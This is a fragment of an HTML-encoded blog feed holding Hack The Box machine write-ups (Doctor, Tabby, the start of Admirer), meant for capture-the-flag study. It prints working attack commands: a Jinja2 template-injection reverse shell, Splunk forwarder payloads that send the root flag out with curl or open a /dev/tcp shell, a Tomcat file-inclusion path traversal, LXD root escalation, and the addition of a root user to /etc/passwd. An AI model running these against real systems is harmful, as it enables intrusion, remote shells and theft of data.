&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-source-page.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This page is empty:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-archive.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But we can register new account and post anywant:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-account.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-post.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And this archive page are updated with our post:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-archive-test.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can determine the using of template language programmation in this website.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-reveal-jinja2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The payload returns 7777777 and we can identify template used here: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jinja2&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-foothold---get-into-the-target-&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[3] Foothold - Get into the target &lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;server-side-template-injection-with-jinja2&quot;&gt;Server Side Template Injection with Jinja2&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Reference: &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection&quot;&gt;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;get-remote-file&quot;&gt;Get remote file&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.. get_flashed_messages.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read() ..
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-passwd.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;gain-rce&quot;&gt;Gain RCE&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;..['__import__']('os').popen(&quot;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;IP\&quot;,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/bash\&quot;, \&quot;-i\&quot;]);'&quot;).read().zfill(417) ..
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-rce-1.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;4-lateral-movement---move-through-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[4] Lateral Movement - Move through environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;linpeas-reveal-password-in-varlogbackup&quot;&gt;Linpeas reveal password in /var/log/backup&lt;/h3&gt;
&lt;hr /&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;![Desktop View]({ “/assets/images/doctor/HTB-Images-Doctor-linpeas.png”&lt;/td&gt;
      &lt;td&gt;relative_url })&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;su-shaun&quot;&gt;su Shaun&lt;/h3&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Username: Shaun
Password: Guitar123
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-su-shaun.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;5-privilege-escalation---gain-higher-level-permissions&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[5] Privilege Escalation - Gain higher-level permissions&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;abusing-splunk-forwarders&quot;&gt;Abusing Splunk Forwarders&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;References:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/&quot;&gt;https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/cnotin/SplunkWhisperer2&quot;&gt;https://github.com/cnotin/SplunkWhisperer2&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Shaun account is used like UF agent –&amp;gt; we can run arbitrary command on the server as root.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-agent-password.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;get-root-flag&quot;&gt;Get root flag&lt;/h4&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python3 PySplunkWhisperer2_remote.py &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt; doctors.htb &lt;span class=&quot;nt&quot;&gt;--port&lt;/span&gt; XXXX &lt;span class=&quot;nt&quot;&gt;--username&lt;/span&gt; XXXX &lt;span class=&quot;nt&quot;&gt;--password&lt;/span&gt; XXXX &lt;span class=&quot;nt&quot;&gt;--payload&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;curl -F 'data=@/root/root.txt' http://IP:PORT&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--lhost&lt;/span&gt; IP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-flag.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;gain-rce-1&quot;&gt;Gain RCE&lt;/h4&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python3 PySplunkWhisperer2_remote.py &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt; doctors.htb &lt;span class=&quot;nt&quot;&gt;--port&lt;/span&gt; XXXX &lt;span class=&quot;nt&quot;&gt;--username&lt;/span&gt; XXXX &lt;span class=&quot;nt&quot;&gt;--password&lt;/span&gt; XXXX &lt;span class=&quot;nt&quot;&gt;--payload&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/IP/PORT 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--lhost&lt;/span&gt; IP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/doctor/HTB-Images-Doctor-rce-2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;trophy&quot;&gt;&lt;strong&gt;&lt;center&gt;Trophy&lt;/center&gt;&lt;/strong&gt;&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;I don’t know how to put this but I’m kind of a big deal. People know me. I’m very important. I have many leather-bound books and my apartment smells of rich mahogany&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;Ron Burgundy&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>ScarNGone &amp; pcw3r</name></author><category term="HackTheBox" /><category term="Machine" /><category term="Linux" /><category term="Easy" /><category term="SSTI" /><category term="Splunk" /><category term="Jinja2" /><summary type="html">Ref°: HTB-18-Machine</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/images/doctor/HTB-Badge-Doctor.png" /><media:content medium="image" url="/assets/images/doctor/HTB-Badge-Doctor.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Write-up Tabby Machine</title><link href="/posts/HTB-17-Pentest-Tabby/" rel="alternate" type="text/html" title="Write-up Tabby Machine" /><published>2020-11-07T17:00:00+01:00</published><updated>2020-11-07T17:00:00+01:00</updated><id>/posts/HTB-17-Pentest-Tabby</id><content type="html" xml:base="/posts/HTB-17-Pentest-Tabby/">&lt;p&gt;&lt;strong&gt;&lt;center&gt;Ref°: HTB-17-Machine&lt;/center&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;— Tabby is a vulnerable machine through LFI in tomcat service and the reuse of a password to get into the target.&lt;/p&gt;

&lt;p&gt;Privesc is possible from container LXD exploitation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Information-Tabby.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-discovery---figure-out-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[1] Discovery - Figure out environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;network-service-scanning&quot;&gt;Network Service Scanning&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We have the 4 following open ports : 22, 80, 8080 and 4446&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-nmap.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;website-on-port-80&quot;&gt;Website on port 80&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We have website present on port 80.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-website.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;THe main page reveal “We apologise to all our customers for the previous data breach. We have changed the site to remove this tool, and have invested heavily in more secure servers.”&lt;/p&gt;

&lt;p&gt;Interesting page : &lt;a href=&quot;http://megahosting.htb/news.php&quot;&gt;http://megahosting.htb/news.php&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;tomcat-service-on-port-8080&quot;&gt;Tomcat service on port 8080&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Interesting paths who need authentication :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://10.10.10.194:8080/host-manager/html&quot;&gt;http://10.10.10.194:8080/host-manager/html&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://10.10.10.194:8080/manager/html&quot;&gt;http://10.10.10.194:8080/manager/html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-tomcat.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-weaponization---find-exploit-way&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[2] Weaponization - Find exploit way&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;fuzzing-and-lfi-in-tomcat-service&quot;&gt;Fuzzing and LFI in Tomcat service&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Reference : &lt;a href=&quot;https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1&quot;&gt;https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Tomcat is vulnerable to LFI attack. We using this technique to recover sensitive information.&lt;/p&gt;

&lt;p&gt;Grab passwd file for example :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-LFI_passwd.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-information_users.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We know that Tomcat service has interesting information in its file “tomcat-users.xml” and the location seem to be in $CATALINA_HOME : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/tomcat9/conf/tomcat-users.xml&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Fuzzing method can help us to search the good location of this file.&lt;/p&gt;

&lt;p&gt;Reference : &lt;a href=&quot;https://wfuzz.readthedocs.io/en/latest/user/advanced.html&quot;&gt;https://wfuzz.readthedocs.io/en/latest/user/advanced.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-fuzzing.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Result success on folder &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;etc&lt;/code&gt; and get the file :&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;wget http://10.10.10.194/news.php?file=../../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Plaintext password and rolename!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-rolename_tomcat.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The role rolename=”manager-script allows access to the text interface and the status pages only.&lt;/p&gt;

&lt;p&gt;We have the possibility to connect now on host-manager but we can’t exploit anything.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-tomcat_host_manager.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-foothold---get-into-the-target-&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[3] Foothold - Get into the target &lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;deploy-malicious-remote-script-on-tomcat-manager&quot;&gt;Deploy malicious remote script on tomcat manager&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Reference : &lt;a href=&quot;https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script&quot;&gt;https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-payload.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-deploy_remote_script_tomcat.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We launch this new script from URL : http://10.10.10.194/privuser45&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-get_revshell.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;4-lateral-movement---move-through-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[4] Lateral Movement - Move through environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;recover-archive-backup&quot;&gt;Recover archive backup&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Archive file backup present under website folders. We recover it to try finding anything inside.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;wget http://10.10.10.194/files/16162020_backup.zip
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cracking-archive-password&quot;&gt;Cracking archive password&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-archive_password.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-crackzip.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;reusing-password-of-ash-user&quot;&gt;Reusing password of ash user&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;ash user reuse this password and we can connect on from “su” command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-reuse_password.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-flag_user.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;5-privilege-escalation---gain-higher-level-permissions&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[5] Privilege Escalation - Gain higher-level permissions&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Many interesting information about lxd from linpeas enumeration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-linpeas.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-linpeas_1.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-linpeas_2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;container-lxd-exploitation&quot;&gt;Container LXD Exploitation&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;References :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.hackingarticles.in/lxd-privilege-escalation/&quot;&gt;https://www.hackingarticles.in/lxd-privilege-escalation/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/46978&quot;&gt;https://www.exploit-db.com/exploits/46978&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/saghul/lxd-alpine-builder&quot;&gt;https://github.com/saghul/lxd-alpine-builder&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The solution : mount root path in container with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lxd alpine builder&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;From offensive machine :&lt;/p&gt;
&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From victim machine :&lt;/p&gt;
&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;wget 10.10.14.67:1337/alpine-v3.12-x86_64-20200906_1836.tar.gz
lxc image import alpine-v3.12-x86_64-20200906_1836.tar.gz --alias privuser45 &amp;amp;&amp;amp; lxd init --auto
lxc image list
lxc init privuser45 privesc -c security.privileged=true
lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc sh
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-malicious_container.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-create_container.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-conf_container.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we start our malicious container containing root path in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/root/root&lt;/code&gt; .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-privesc_container.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-flag_root.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;bruteforce-with-johntheripper-&quot;&gt;Bruteforce with johntheripper :&lt;/h4&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root:$&lt;/span&gt;6&lt;span class=&quot;nv&quot;&gt;$86Nxy4plrFeu0w4C$IfFB5j7BEbjBrUOtkmxyfUZ0lnNIxAcFn3meuvjGqFPSIogXynKx9FU1w3XJIC60rvwuKcg6feaeBqcNWMO0H&lt;/span&gt;/:18429:0:99999:7:::
&lt;span class=&quot;go&quot;&gt;root:x:0:0:root:/root:/bin/bash
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;#### Add malicious user with root privilege :
Reference : &lt;a href=&quot;https://hacknpentest.com/linux-privilege-escalation-via-writeable-etc-passwd-file/&quot;&gt;https://hacknpentest.com/linux-privilege-escalation-via-writeable-etc-passwd-file/&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;perl -le 'print crypt(&quot;Password@973&quot;,&quot;addedsalt&quot;)'
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;echo &quot;privuser45:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash&quot; &amp;gt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /mnt/root/etc/passwd
&lt;span class=&quot;go&quot;&gt;
lxc delete privesc &amp;amp;&amp;amp; lxc image delete privuser45
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-malicious_user.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tabby/HTB-Images-Tabby-malicious_user_1.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;trophy&quot;&gt;&lt;strong&gt;&lt;center&gt;Trophy&lt;/center&gt;&lt;/strong&gt;&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;If you can’t give me poetry, can’t you give me poetical science?&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;Ada Lovelace&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>ScarNGone &amp; pcw3r</name></author><category term="HackTheBox" /><category term="Machine" /><category term="Linux" /><category term="Easy" /><category term="Fuzzing" /><category term="Local File inclusion" /><category term="Container" /><category term="Password Cracking" /><summary type="html">Ref°: HTB-17-Machine</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/images/tabby/HTB-Badge-Tabby.png" /><media:content medium="image" url="/assets/images/tabby/HTB-Badge-Tabby.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Write-up Admirer Machine</title><link href="/posts/HTB-16-Pentest-Admirer/" rel="alternate" type="text/html" title="Write-up Admirer Machine" /><published>2020-09-26T11:00:00+02:00</published><updated>2020-09-26T11:00:00+02:00</updated><id>/posts/HTB-16-Pentest-Admirer</id><content type="html" xml:base="/posts/HTB-16-Pentest-Admirer/">&lt;p&gt;&lt;strong&gt;&lt;center&gt;Ref°: HTB-16-Machine&lt;/center&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;— Admirer is a vulnerable machine through web and database exploitation to gain foothold.&lt;/p&gt;

&lt;p&gt;Once on the victim machine, we escalate privilege through Sudo permission and Python library Hijacking from admin script execution under root privilege.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Information-Admirer.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-discovery---figure-out-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[1] Discovery - Figure out environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;network-service-scanning&quot;&gt;Network Service Scanning&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We find interesting services &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftp&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on their usual ports.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; 10.10.10.187 &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-nmap.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;robotstxt&quot;&gt;Robots.txt&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt; file make reference about inindexable path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin-dir&lt;/code&gt;. This folder contains apparently “personal contacts” and “creds”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/admirer/HTB-Images-Admirer-robots.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;fuzzing-website&quot;&gt;Fuzzing Website&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We fuzzing Website with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;seclists wordlist&lt;/code&gt; to recover two notes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;contacts.txt&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;credentials.txt&lt;/code&gt;:&lt;/p&gt;

